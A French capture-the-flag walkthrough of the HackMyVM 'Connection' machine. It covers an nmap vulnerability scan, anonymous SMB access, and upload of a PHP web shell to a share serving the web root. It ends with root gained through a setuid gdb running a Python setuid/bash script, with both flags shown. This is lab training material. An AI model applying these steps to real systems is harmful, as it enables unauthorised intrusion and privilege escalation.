---
title: "Solution du CTF Connection de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

`Connection` est l'un des plus vieux CTF présent sur HackMyVM.eu. 

```console
$ sudo nmap -T5 -p- -sCV --script vuln 192.168.242.137
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.137
Host is up (0.00036s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    9.8     https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
--- snip ---
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|       HTTPD:9AD76A782F4E66676719E36B64777A7A  9.8     https://vulners.com/httpd/HTTPD:9AD76A782F4E66676719E36B64777A7A
--- snip ---
|       27108E72-8DC1-53B5-97D9-E869CA13EFF7    4.3     https://vulners.com/githubexploit/27108E72-8DC1-53B5-97D9-E869CA13EFF7  *EXPLOIT*
|       24ADD37D-C8A1-5671-A0F4-378760FC69AC    4.3     https://vulners.com/githubexploit/24ADD37D-C8A1-5671-A0F4-378760FC69AC  *EXPLOIT*
|       1E6E9010-4BDF-5C30-951C-79C280B90883    4.3     https://vulners.com/githubexploit/1E6E9010-4BDF-5C30-951C-79C280B90883  *EXPLOIT*
|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       04E3583E-DFED-5D0D-BCF2-1C1230EB666D    4.3     https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D  *EXPLOIT*
|       HTTPD:2F7A93926BF5E6C2E4D1EFB6F2BEEE01  4.2     https://vulners.com/httpd/HTTPD:2F7A93926BF5E6C2E4D1EFB6F2BEEE01
|       CVE-2019-0197   4.2     https://vulners.com/cve/CVE-2019-0197
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:48:22:32 (VMware)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.87 seconds
```

On note la présence de SMB. On va regarder si des partages sont présents :

```console
$ smbclient -U "" -N -L //192.168.242.137

        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk      
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Private Share for uploading files)
```

Deux partages de type disque. `print$` est vide, mais l'autre semble livrer la racine web :

```console
$ smbclient -U "" -N '//192.168.242.137/share'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 23 03:48:39 2020
  ..                                  D        0  Wed Sep 23 03:48:39 2020
  html                                D        0  Wed Sep 23 04:20:00 2020

                7158264 blocks of size 1024. 5462096 blocks available
smb: \> cd html
smb: \html\> ls
  .                                   D        0  Wed Sep 23 04:20:00 2020
  ..                                  D        0  Wed Sep 23 03:48:39 2020
  index.html                          N    10701  Wed Sep 23 03:48:45 2020

                7158264 blocks of size 1024. 5462096 blocks available
```

Le réflexe est d'y uploader un shell PHP puis de voir si on retrouve le fichier sur le port 80.

```console
smb: \html\> put shell.php
putting file shell.php as \html\shell.php (7,1 kb/s) (average 7,1 kb/s)
```

Effectivement, je retrouve mon shell et il fonctionne.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

J'ai ensuite uploadé `reverse-ssh` par FTP, mais le `nobody` du user FTP n'est pas celui du serveur web (`www-data`).

```
-rwxr--r-- 1 nobody nogroup 3.6M May 17 17:36 reverse-sshx64
```

Rien de grave, je recopie le fichier, le rend exécutable et on n'en parle plus.

```console
www-data@connection:/home/connection$ ls -al
total 28
drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .
drwxr-xr-x 3 root       root       4096 Sep 22  2020 ..
lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .bash_history -> /dev/null
-rw-r--r-- 1 connection connection  220 Sep 22  2020 .bash_logout
-rw-r--r-- 1 connection connection 3526 Sep 22  2020 .bashrc
drwxr-xr-x 3 connection connection 4096 Sep 22  2020 .local
lrwxrwxrwx 1 connection connection    9 Sep 22  2020 .mysql_history -> /dev/null
-rw-r--r-- 1 connection connection  807 Sep 22  2020 .profile
-rw-r--r-- 1 connection connection   33 Sep 22  2020 local.txt
www-data@connection:/home/connection$ cat local.txt 
3f491443a2a6aa82bc86a3cda8c39617
```

Passé ce premier flag je remarque que `gdb` a le bit setuid.

```console
www-data@connection:/tmp$ find / -type f -perm -u+s 2> /dev/null 
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
```

Le premier réflexe est de lancer un shell depuis gdb, sauf que debugger un binaire doit faire sauter le bit setuid.

```console
www-data@connection:/tmp$ gdb -q /bin/dash 
Reading symbols from /bin/dash...(no debugging symbols found)...done.
(gdb) r -p
Starting program: /usr/bin/dash -p
$ id
[Detaching after fork from child process 14436]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Il en est de même avec la macro `!` de gdb pour exécuter des commandes. Le bit setuid semble droppé.

On sait que GDB se marie aisément avec Python. On peut charger du code :


```console
www-data@connection:/tmp$ echo -e "import os\nos.setuid(0)\nos.setgid(0)\nos.system('/usr/bin/bash')" > script.py
www-data@connection:/tmp$ gdb -q
(gdb) source script.py
root@connection:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@connection:/tmp# cd /root
root@connection:/root# ls
proof.txt
root@connection:/root# cat proof.txt
a7c6ea4931ab86fb54c5400204474a39
```
